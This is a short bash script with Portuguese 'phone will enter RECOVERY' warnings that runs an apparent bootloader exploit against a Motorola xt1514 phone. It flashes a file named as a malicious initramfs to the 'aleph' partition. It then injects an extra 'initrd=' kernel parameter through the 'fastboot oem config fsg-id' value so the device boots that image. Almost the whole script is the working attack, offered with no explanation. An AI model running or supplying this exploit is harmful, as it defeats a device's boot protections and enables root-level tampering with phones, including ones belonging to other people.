#!/bin/bash
echo "ATENÇAO: celular entrará em RECOVERY";
echo "ATENÇAO: celular entrará em RECOVERY";
echo "ATENÇAO: celular entrará em RECOVERY";
echo "ATENÇAO: celular entrará em RECOVERY";
echo "ATENÇAO: celular entrará em RECOVERY";
echo "ATENÇAO: celular entrará em RECOVERY";
echo "ATENÇAO: celular entrará em RECOVERY";

FILE_NAME=initroot-xt1514-p64-MALICIOUS.cpio.gz;

fastboot flash aleph $FILE_NAME
sleep 4

fastboot oem config fsg-id "a initrd=0x94000000,1720053"
sleep 2

fastboot continue
sleep 2

sleep 5

adb devices
